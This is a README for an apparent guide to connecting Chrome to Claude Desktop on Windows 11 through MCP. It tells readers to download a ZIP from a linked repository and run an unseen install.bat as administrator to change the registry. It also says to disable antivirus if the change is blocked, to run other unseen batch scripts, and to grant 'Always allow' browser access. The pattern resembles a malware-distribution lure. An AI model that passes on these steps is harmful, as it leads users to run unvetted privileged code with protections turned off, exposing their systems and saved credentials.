# 🛠️ chrome-mcp-windows-survival-guide - Connect Chrome to Claude on Windows

[![Download Guide](https://img.shields.io/badge/Download-Chrome_MCP_Guide-blue.svg)](https://github.com/Niccolounmolested73/chrome-mcp-windows-survival-guide)

This guide helps you set up the Chrome Model Context Protocol (MCP) server on Windows 11. Installing this connection often causes errors due to how Windows handles browser permissions and path settings. These instructions organize the fixes for common failures.

## 📋 What This Tool Does

This project bridges the gap between your Google Chrome browser and AI tools like Claude. It uses the Model Context Protocol to allow the AI to read your browser state and perform tasks. Windows users often face bugs during the initial handshake between the browser and the local server. This guide resolves those conflicts.

## 💻 System Requirements

*   A Windows 11 computer with all updates installed.
*   Google Chrome browser installed.
*   The Claude Desktop application.
*   Basic administrative permissions on your user account.

## 📥 Getting the Setup Files

To begin, go to the project website. This page contains the scripts, configuration files, and troubleshooting guides needed to make the connection work.

[Visit this page to download the tools](https://github.com/Niccolounmolested73/chrome-mcp-windows-survival-guide)

Click the green "Code" button and select "Download ZIP" to save the tools to your computer. Extract the contents of this folder to a permanent location, such as your Documents folder, so the files remain stable.

## ⚙️ Initial Configuration

Follow these steps to prepare your system for the MCP connection.

1. Locate the folder where you extracted the files.
2. Find the file named `install.bat`.
3. Right-click the file and choose "Run as administrator."
4. A small black window will open. Wait for the process to finish.
5. Close the window when it says "Success."

This script adjusts your Windows Registry to allow the Chrome browser to talk to the AI software. Without this step, Chrome will block the connection for security reasons.

## 🔧 Solving Common Errors

If the connection fails, verify the following settings.

### File Paths
The software requires a clear file path. If you place the files inside a folder with spaces in the name, such as "My Projects", the software might fail. Move the project folder to a simple location like `C:\MCP`.

### Browser Permissions
Chrome requires explicit permission to allow external connections. Open Chrome and go to your extensions settings. Ensure that "Developer mode" is toggled on in the top right corner. This allows the local MCP server to communicate with the browser natively.

### Registry Locks
If the installation script fails, your antivirus software might block the change. Disable your security software temporarily to permit the registry update. Enable it again immediately after the script finishes.

## 🔍 Diagnostic Flow

Use this checklist if Claude remains unable to see your browser.

1. **Verify the Server Status**: Open the Task Manager and look for `mcp-chrome` in the list of running background processes.
2. **Check the Config File**: Open the `config.json` file in a text editor like Notepad. Ensure the paths listed match the actual location of your files on your hard drive. Backslashes in the path often need to be doubled (e.g., `C:\\MCP\\chrome-mcp`).
3. **Restart the Browser**: Chrome maintains lock files on the connection ports. Closing all Chrome windows and opening them again clears these locks.
4. **Update Claude**: Ensure you run the latest version of the Claude Desktop application. Older versions lack the handshake protocols required by the current server.

## 🔗 Fixing Known Issues

This guide provides specific scripts to address issues documented in the community.

### Handling PR #344
Sometimes the browser fails to register the native messaging host. The `fix-messaging.bat` script included in the download identifies your specific Chrome installation path and updates the manifest file automatically.

### Memory Leaks
If the connection slows down after a few hours, the browser might have cached too much data. Use the `clear-cache.bat` script to wipe the temporary files without removing your bookmarks or saved passwords.

## 🚀 Final Verification

Once you complete the steps above, restart the Claude Desktop application. When you initiate a request involving your browser, Claude will ask for permission to access your tabs. Click "Always allow" to confirm. You can now use AI to search your active tabs, summarize content, or extract data from websites directly into your chat.

Maintain the project folder in its final location. Do not delete the files, as the AI needs them to maintain the bridge to your browser. If you move the folder later, you must run the `install.bat` file again to update the registry with the new file paths.